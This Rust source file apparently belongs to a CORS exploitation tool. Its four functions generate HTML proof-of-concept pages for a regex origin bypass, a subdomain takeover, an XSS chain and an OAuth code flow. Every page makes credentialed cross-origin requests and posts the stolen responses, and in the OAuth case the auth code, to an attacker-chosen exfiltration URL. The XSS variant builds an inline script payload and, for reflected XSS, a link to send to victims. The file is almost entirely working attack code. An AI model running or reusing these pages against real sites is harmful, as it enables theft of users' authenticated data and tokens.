fn generate_regex_bypass_poc(target_url: &str, exfil_url: &str, bypass_origin: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS PoC - Regex Bypass from {bypass_origin}</title></head>
<body>
<h1>CORS Regex Bypass PoC</h1>
<p>Target: {target_url}</p>
<p>Bypass Origin: {bypass_origin}</p>
<div id="result">Waiting...</div>
<script>
// This page must be hosted on: {bypass_origin}
(function() {{
    fetch('{target_url}', {{
        credentials: 'include',
        mode: 'cors'
    }})
    .then(function(r) {{ return r.text(); }})
    .then(function(data) {{
        document.getElementById('result').innerText = data;
        return fetch('{exfil_url}', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                stolen_from: '{target_url}',
                via_origin: '{bypass_origin}',
                data: data
            }})
        }});
    }});
}})();
</script>
</body>
</html>"#
    )
}

fn generate_subdomain_takeover_poc(target_url: &str, exfil_url: &str, subdomain: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS PoC - Subdomain Takeover ({subdomain})</title></head>
<body>
<h1>CORS Subdomain Takeover PoC</h1>
<p>Target: {target_url}</p>
<p>Taken-over subdomain: {subdomain}</p>
<div id="result">Waiting...</div>
<script>
// This page is hosted on the taken-over subdomain: {subdomain}
(function() {{
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '{target_url}', true);
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {{
        if (xhr.readyState === 4) {{
            document.getElementById('result').innerText = xhr.responseText;
            navigator.sendBeacon('{exfil_url}', JSON.stringify({{
                stolen_from: '{target_url}',
                via_subdomain: '{subdomain}',
                data: xhr.responseText
            }}));
        }}
    }};
    xhr.send();
}})();
</script>
</body>
</html>"#
    )
}

fn generate_xss_cors_poc(
    target_url: &str,
    exfil_url: &str,
    xss_url: &str,
    xss_param: &str,
    is_stored: bool,
) -> String {
    let xss_payload = format!(
        r#"<script>fetch('{target_url}',{{credentials:'include'}}).then(r=>r.text()).then(d=>fetch('{exfil_url}',{{method:'POST',body:JSON.stringify({{stolen:d}})}}))</script>"#
    );

    let delivery = if is_stored {
        format!(
            "<!-- Stored XSS: inject the payload below into {xss_url} via parameter '{xss_param}' -->\n\
             <!-- The payload will execute for every user who views the page -->"
        )
    } else {
        format!(
            "<!-- Reflected XSS: send victim the following link -->\n\
             <!-- {xss_url}?{xss_param}={encoded_payload} -->",
            encoded_payload = simple_url_encode(&xss_payload)
        )
    };

    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS PoC - XSS Chain</title></head>
<body>
<h1>CORS + XSS Chain PoC</h1>
<p>CORS Target: {target_url}</p>
<p>XSS Vector: {xss_url} (param: {xss_param})</p>
<p>Type: {xss_type}</p>
{delivery}
<h2>XSS Payload:</h2>
<pre>{xss_payload}</pre>
<h2>Explanation:</h2>
<ol>
<li>Payload is injected via {xss_type} XSS on {xss_url}</li>
<li>Script executes in the context of the trusted origin</li>
<li>Credentialed CORS request is sent to {target_url}</li>
<li>Response data is exfiltrated to {exfil_url}</li>
</ol>
</body>
</html>"#,
        xss_type = if is_stored { "stored" } else { "reflected" },
    )
}

fn generate_oauth_poc(
    target_url: &str,
    exfil_url: &str,
    auth_url: &str,
    client_id: &str,
    scopes: &[String],
) -> String {
    let scope_str = scopes.join("+");

    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS PoC - OAuth Token Theft</title></head>
<body>
<h1>CORS + OAuth Token Theft PoC</h1>
<p>CORS Target: {target_url}</p>
<p>OAuth Provider: {auth_url}</p>
<div id="result">Waiting for OAuth redirect...</div>
<script>
(function() {{
    // Step 1: Check if we have an auth code from redirect
    var params = new URLSearchParams(window.location.search);
    var code = params.get('code');

    if (!code) {{
        // Redirect user to OAuth authorization
        window.location = '{auth_url}/authorize?client_id={client_id}&redirect_uri=' +
            encodeURIComponent(window.location.href) +
            '&scope={scope_str}&response_type=code';
        return;
    }}

    // Step 2: We have the code, now exploit CORS to steal tokens
    document.getElementById('result').innerText = 'Got auth code: ' + code;

    fetch('{target_url}', {{
        credentials: 'include',
        mode: 'cors'
    }})
    .then(function(r) {{ return r.text(); }})
    .then(function(data) {{
        // Step 3: Exfiltrate everything
        return fetch('{exfil_url}', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                auth_code: code,
                cors_data: data,
                target: '{target_url}'
            }})
        }});
    }});
}})();
</script>
</body>
</html>"#
    )
}
